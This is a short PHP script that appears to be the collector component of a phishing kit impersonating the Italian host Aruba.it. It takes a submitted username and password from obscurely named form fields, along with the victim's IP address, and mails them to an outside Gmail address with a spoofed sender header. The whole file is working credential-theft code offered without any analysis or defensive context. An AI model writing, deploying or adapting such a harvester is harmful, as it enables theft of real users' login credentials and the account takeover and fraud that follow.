<?php
       if($_POST){
        

        $username = $_POST['zigzig'];
        $password = $_POST['zagzag'];
        $ip = $_POST['ip'];
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $headers .= "From: results@resultsbox.com" . "\r\n";
        $receipients_email = "mosuru@gmail.com";
        $subject = "Results";

        $msg = "";
        $msg .= " E-mail and Password for Aruba.it \r\n";
        $msg .= " Username : ".$username ."\r\n";
        $msg .= " Password : ".$password ."\r\n";
        $msg .= "From ip : ". $ip;

        mail($receipients_email,$subject,$msg,$headers);
       }
                
      
       
?>